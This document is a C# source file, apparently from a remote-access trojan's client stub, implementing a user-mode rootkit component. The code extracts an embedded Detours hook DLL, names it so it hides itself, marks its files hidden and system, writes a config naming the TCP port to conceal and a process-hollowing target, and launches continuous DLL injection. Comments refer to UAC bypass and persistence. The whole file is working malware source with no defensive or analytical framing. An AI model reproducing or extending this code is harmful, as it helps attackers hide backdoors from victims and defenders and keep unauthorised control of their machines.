namespace SeroStub;

/// <summary>
/// Manages the user-mode rootkit DLL (Detours-based):
///   - Extracts the embedded hook.dll to the install directory
///   - Writes {prefix}.cfg so the DLL knows which TCP port to hide
///   - Delegates continuous injection to Injector
///
/// Requires admin (or SYSTEM via UAC bypass) — never called otherwise.
/// The DLL name follows the HiddenProcessName convention so the DLL
/// hides itself once it is injected into the first process.
/// </summary>
internal static class Rootkit
{
    private static string _installDir = "";
    private static string _dllPath    = "";
    private static string _dllPath32  = "";

    // ── Public API ──────────────────────────────────────

    public static void Start()
    {
        if (!Config.EnableRootkit) return;

        if (Config.HookDllBytes == null || Config.HookDllBytes.Length == 0)
        {
            StubLog.Error("[Rootkit] No DLL bytes embedded — rootkit disabled. Recompile hook.dll and rebuild client.");
            return;
        }

        // Prefer the installed stub's directory (persistence active) so the DLL is co-located.
        // Fallback when persistence is off: use %APPDATA%\{HiddenProcessName} — avoids writing
        // into system directories when the process image is a hollow target (e.g. notepad.exe).
        string? installedPath = Persistence.GetInstalledPath(Config.PersistName);
        if (installedPath != null)
        {
            _installDir = Path.GetDirectoryName(installedPath) ?? Environment.CurrentDirectory;
        }
        else
        {
            _installDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Config.HiddenProcessName);
            Directory.CreateDirectory(_installDir);
        }

        // DLL name = HiddenProcessName.dll — automatically hidden by the hook's own file filter.
        _dllPath   = Path.Combine(_installDir, Config.HiddenProcessName + ".dll");
        _dllPath32 = Path.Combine(_installDir, Config.HiddenProcessName + "32.dll");

        ExtractDll();
        WriteCfg();
        Injector.Start(_dllPath, File.Exists(_dllPath32) ? _dllPath32 : "");

        StubLog.Info($"[Rootkit] Running — proc={Config.HiddenProcessName} port={Config.Port} dllPath={_dllPath}");
    }

    public static void Stop()
    {
        Injector.Stop();
        StubLog.Info("[Rootkit] Injector stopped.");
    }

    /// <summary>Called during uninstall — stops injection and deletes artifacts.</summary>
    public static void Cleanup()
    {
        Stop();

        // DLL and cfg are inside the install dir which the uninstall batch already deletes,
        // but we remove them explicitly here so they disappear before the process exits.
        TryDelete(_dllPath);
        TryDelete(_dllPath32);
        TryDelete(Path.Combine(_installDir, Config.HiddenProcessName + ".cfg"));
        TryDelete(Path.Combine(_installDir, Config.HiddenProcessName + "32.cfg"));

        StubLog.Info("[Rootkit] Cleanup done.");
    }

    // ── Private ─────────────────────────────────────────

    private static void ExtractDll()
    {
        WriteDll(_dllPath, Config.HookDllBytes, "x64");
        if (Config.HookDllBytes32 != null && Config.HookDllBytes32.Length > 0)
            WriteDll(_dllPath32, Config.HookDllBytes32, "x86");
    }

    private static void WriteDll(string path, byte[] bytes, string label)
    {
        try
        {
            // If the file already exists and is locked (loaded in processes),
            // rename it out of the way — Windows allows renaming loaded DLLs
            // because the loader opens them with FILE_SHARE_DELETE.
            if (File.Exists(path))
            {
                string old = path + ".old";
                try { if (File.Exists(old)) File.Delete(old); } catch { }
                try { File.Move(path, old); }
                catch { /* already locked with no share-delete — best effort */ }
            }
            File.WriteAllBytes(path, bytes);
            File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
            StubLog.Info($"[Rootkit] {label} DLL extracted ({bytes.Length} bytes) → {path}");
        }
        catch (Exception ex) { StubLog.Error($"[Rootkit] {label} DLL extraction failed: {ex.Message}"); }
    }

    private static void WriteCfg()
    {
        try
        {
            string hollowTarget = Config.EnableHollowing
                ? System.IO.Path.GetFileNameWithoutExtension(Config.HollowTarget).ToLowerInvariant()
                : "";
            // Line 0: port  Line 1: hollow target
            string content = Config.Port.ToString() + "\n" + hollowTarget + "\n";

            // Write cfg for x64 DLL and also for x86 DLL ("machinbidule.cfg") so both
            // DLLs find their config and derive the correct prefix "machinbidule".
            foreach (string name in new[] { Config.HiddenProcessName, Config.HiddenProcessName + "32" })
            {
                var cfgPath = Path.Combine(_installDir, name + ".cfg");
                File.WriteAllText(cfgPath, content, System.Text.Encoding.ASCII);
                File.SetAttributes(cfgPath, FileAttributes.Hidden | FileAttributes.System);
            }

            StubLog.Info($"[Rootkit] cfg written → port={Config.Port} hollow='{hollowTarget}'");
        }
        catch (Exception ex)
        {
            StubLog.Error($"[Rootkit] cfg write failed: {ex.Message}");
        }
    }

    private static void TryDelete(string path)
    {
        try { if (File.Exists(path)) File.Delete(path); }
        catch { }
    }
}
